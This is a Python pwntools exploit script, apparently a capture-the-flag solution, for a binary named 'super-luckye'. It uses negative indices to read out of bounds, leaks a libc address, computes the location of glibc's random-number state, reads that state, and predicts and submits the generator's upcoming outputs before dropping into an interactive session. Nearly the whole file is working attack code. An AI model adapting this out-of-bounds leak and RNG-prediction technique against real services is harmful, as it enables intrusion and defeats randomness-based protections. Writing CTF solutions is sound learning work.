#!/usr/bin/env python3
# from pwn import *
import pwn
import array 

exe = pwn.ELF("./super-luckye")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")
def conn():
    if pwn.args.REMOTE:
        p = pwn.remote("addr", 1337)
    else:
        pwn.context.log_level = "debug"
        pwn.context.terminal = ["foot"]
        p = pwn.process([exe.path])
        # pwn.gdb.attach(p, gdbscript='''
        #     b*0x0000000000401352
        #
        # ''')
    return p
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
l = lambda data: pwn.log.info(data)

def convert(value):
    #this function will convert int to unsigned int
    converted = value & 0xffffffff
    return converted 
def handle_(listu,listu1,listu2):
   predict = []
   predict.append(convert(int((listu[0]+listu[3])))>>1)
   listu2.append(convert(int((listu[0]+listu[3]))))
   predict.append(convert(int((listu[1]+listu[4])))>>1)
   listu2.append(convert(int((listu[1]+listu[4]))))
   predict.append(convert(int((listu[2]+listu[5])))>>1)
   listu2.append(convert(int((listu[2]+listu[5]))))
   predict.append(convert(int((listu1[1]+listu2[0])))>>1)
   listu2.append(convert(int((listu1[1]+listu2[0]))))
   predict.append(convert(int((listu1[2]+listu2[1])))>>1)
   listu2.append(convert(int((listu1[2]+listu2[1]))))
   predict.append(convert(int((listu1[3]+listu2[2])))>>1)
   listu2.append(convert(int((listu1[3]+listu2[2]))))
   predict.append(convert(int((listu1[4]+listu2[3])))>>1)
   listu2.append(convert(int((listu1[4]+listu2[3]))))
   for i in range(len(predict)):
       pwn.log.info(f"predict [{i+1}]: {hex(predict[i])}")
       sla(b":",str(predict[i]).encode("UTF-8"))
    # sla(b":",str(i).encode("UTF-8"))

def leak(index,listu,nums):
    for i in range(0,nums):
        sl(f"{index+i*2}".encode())
        p.recvuntil(f": ".encode())
        part1 = convert(int(p.recvuntil(b"\n",drop=True)))
        listu.append(int(part1))
        sl(f"{index+i*2+1}".encode())
        p.recvuntil(f": ".encode())
        part2 = convert(int(p.recvuntil(b"\n",drop=True)))
        listu.append(int(part2))
def leak1(index):
    sl(f"{index}".encode())
    p.recvuntil(f": ".encode())
    part1 = convert(int(p.recvuntil(b"\n",drop=True)))
    return part1
# pwning lmao lmao dark bruh

if __name__ == "__main__":
    p = conn()
    sla(b"Take your pick 0-777:",b"-36")
    p.recvuntil(b"Here's lucky number #1: ")
    part1 = hex(convert(int(p.recvuntil(b"\n",drop=True)))).encode("UTF-8")[2:]
    # log.info(f"part1: "+hex(part1))
    sl(b"-35")
    p.recvuntil(b"Here's lucky number #2: ")
    part2 = hex(int(p.recvuntil(b"\n",drop=True))).encode("UTF-8")
    # log.info(f"part2: " + part2)
    leak_libc = int(part2+part1,16)
    libc_base = leak_libc - 0xea300
    pwn.log.info(f"leak_libc: "+hex(leak_libc))
    base_libc = leak_libc - 0x101fc0
    pwn.log.info(b"base_libc: " + hex(base_libc).encode())
    unsafe_state =  base_libc + 0x1da030
    lucky_numbers = 0x404040
    pwn.log.info(b"unsafe_state: " + hex(unsafe_state).encode())
    index = (unsafe_state - lucky_numbers) // 4
    listu = []
    listu1= []
    listu2= []
    leak(index-3,listu,3)
    leak(index+2,listu1,6)
    listu1.append(leak1(index+9*2))
    for i in range(len(listu)):
        pwn.log.info(f"listu[{i}]: {hex(listu[i])}")
    handle_(listu,listu1,listu2)
    for i in range(len(listu1)):
        pwn.log.info(f"listu1[{i}]: {hex(listu1[i])}")
    for i in range(len(listu2)):
        pwn.log.info(f"listu2[{i}]: {hex(listu2[i])}")
        # sl(b"3241")
        # sl(b"3241")
        # sl(b"3241")

#0x7fffffffe6fc





    # good luck pwning :)
    p.interactive()
